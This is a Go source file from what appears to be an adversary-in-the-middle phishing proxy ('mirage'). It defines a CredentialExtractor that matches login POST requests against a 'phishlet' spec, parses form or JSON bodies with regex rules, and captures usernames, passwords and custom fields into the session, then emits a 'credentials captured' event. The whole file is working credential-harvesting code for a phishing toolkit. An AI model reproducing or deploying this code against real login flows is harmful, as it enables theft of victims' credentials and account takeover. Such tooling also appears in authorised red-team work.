package request

import (
	"bytes"
	"io"
	"net/http"
	"net/url"
	"strings"

	"github.com/travisbale/mirage/internal/aitm"
	"github.com/travisbale/mirage/internal/proxy"
)

// SessionUpdater persists session changes.
type CredentialSessionUpdater interface {
	UpdateSession(session *aitm.Session) error
}

// CredentialExtractor captures username and password from matching login requests.
type CredentialExtractor struct {
	Store CredentialSessionUpdater
	Bus   aitm.EventBus
}

func (h *CredentialExtractor) Name() string { return "CredentialExtractor" }

func (h *CredentialExtractor) Handle(ctx *aitm.ProxyContext, req *http.Request) error {
	if ctx.Phishlet == nil || ctx.Session == nil {
		return nil
	}
	if !matchesLoginPath(ctx.Phishlet.Login, req) {
		return nil
	}
	bodyBytes, err := readAndRestoreBody(req)
	if err != nil || len(bodyBytes) == 0 {
		return nil
	}

	updated := false
	rules := ctx.Phishlet.Credentials

	if username := extractField(rules.Username, bodyBytes, req); username != "" && ctx.Session.Username == "" {
		ctx.Session.Username = username
		updated = true
	}
	if password := extractField(rules.Password, bodyBytes, req); password != "" && ctx.Session.Password == "" {
		ctx.Session.Password = password
		updated = true
	}
	for _, customRule := range rules.Custom {
		if value := extractField(customRule.CredentialRule, bodyBytes, req); value != "" {
			if ctx.Session.Custom == nil {
				ctx.Session.Custom = make(map[string]string)
			}
			ctx.Session.Custom[customRule.Name] = value
			updated = true
		}
	}

	if updated {
		_ = h.Store.UpdateSession(ctx.Session)
		h.Bus.Publish(aitm.Event{Type: aitm.EventCredsCaptured, Payload: ctx.Session})
	}
	return nil
}

func matchesLoginPath(login aitm.LoginSpec, req *http.Request) bool {
	if req.Method != http.MethodPost {
		return false
	}
	if login.Domain != "" && !strings.HasSuffix(strings.ToLower(req.Host), strings.ToLower(login.Domain)) {
		return false
	}
	if login.Path != "" && !strings.HasPrefix(req.URL.Path, login.Path) {
		return false
	}
	return true
}

func readAndRestoreBody(req *http.Request) ([]byte, error) {
	if req.Body == nil {
		return nil, nil
	}
	bodyBytes, err := io.ReadAll(req.Body)
	req.Body.Close()
	req.Body = io.NopCloser(bytes.NewReader(bodyBytes))
	return bodyBytes, err
}

func extractField(rule aitm.CredentialRule, body []byte, req *http.Request) string {
	switch rule.Type {
	case "post":
		parsed, err := url.ParseQuery(string(body))
		if err != nil {
			return ""
		}
		for key, values := range parsed {
			if rule.Key != nil && rule.Key.MatchString(key) {
				for _, value := range values {
					if rule.Search != nil {
						if matches := rule.Search.FindStringSubmatch(value); len(matches) > 1 {
							return matches[1]
						}
						return value
					}
					return value
				}
			}
		}
	case "json":
		// JSON body parsing: find key matching rule.Key and extract value matching rule.Search.
		if rule.Key != nil && rule.Search != nil {
			if matches := rule.Search.FindSubmatch(body); len(matches) > 1 {
				return string(matches[1])
			}
		}
	}
	return ""
}

var _ proxy.RequestHandler = (*CredentialExtractor)(nil)
